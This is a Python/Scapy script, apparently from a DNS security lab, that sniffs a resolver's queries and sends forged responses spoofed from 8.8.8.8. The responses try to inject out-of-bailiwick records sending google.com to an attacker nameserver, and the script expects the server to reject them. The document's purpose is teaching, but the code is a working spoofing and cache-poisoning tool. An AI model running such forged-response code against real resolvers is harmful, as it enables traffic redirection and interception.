#!/usr/bin/env python3
"""
Task 8: Targeting Another Domain (Bailiwick Test)
This script attempts to poison cache for unrelated domains (should fail).
"""

from scapy.all import *

# Configuration
DNS_SERVER_IP = "10.9.0.16"
ATTACKER_IP = "10.9.0.17"
TARGET_DOMAIN = "www.example.net"
MALICIOUS_DOMAIN = "www.google.com"
FAKE_IP = "10.9.0.17"
DNS_SRC_PORT = 33333

def bailiwick_attack(pkt):
    """
    Try to inject records for unrelated domain (should be rejected)
    """
    if DNS in pkt and pkt[DNS].qr == 0:
        query_name = pkt[DNS].qd.qname.decode('utf-8')

        if TARGET_DOMAIN in query_name:
            print(f"[+] Intercepted query: {query_name}")
            print(f"[!] Attempting to poison cache for unrelated domain: {MALICIOUS_DOMAIN}")

            ip = IP(dst=DNS_SERVER_IP, src="8.8.8.8")
            udp = UDP(dport=DNS_SRC_PORT, sport=53)

            dns = DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                # Answer the original query
                an=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    ttl=300,
                    rdata=ATTACKER_IP
                ),
                # Try to inject record for google.com (out of bailiwick!)
                ns=DNSRR(
                    rrname=b"google.com.",
                    type=2,
                    ttl=86400,
                    rdata=b"ns.attacker32.com."
                ),
                # Additional section with A record
                ar=DNSRR(
                    rrname=MALICIOUS_DOMAIN.encode(),
                    ttl=86400,
                    rdata=FAKE_IP
                )
            )

            spoofed_pkt = ip/udp/dns
            for i in range(10):
                send(spoofed_pkt, verbose=0)

            print(f"[+] Sent spoofed response with google.com injection")
            print(f"[?] Expected: DNS server should REJECT out-of-bailiwick records")
            print(f"[!] Check if google.com appears in cache (it shouldn't!)")
            print("-" * 60)

print("=" * 60)
print("Task 8: Bailiwick Protection Test")
print("=" * 60)
print(f"Queried Domain: {TARGET_DOMAIN}")
print(f"Attempted Injection: {MALICIOUS_DOMAIN} -> {FAKE_IP}")
print()
print("This attack should FAIL due to bailiwick protection.")
print("The DNS server should reject records outside the queried domain.")
print()
print("Trigger: docker exec -it user-machine dig www.example.net")
print("Check: rndc dumpdb -cache && grep google.com /var/cache/bind/dump.db")
print("=" * 60)
print()

sniff(filter=f"udp src port {DNS_SRC_PORT} and dst port 53", prn=bailiwick_attack)
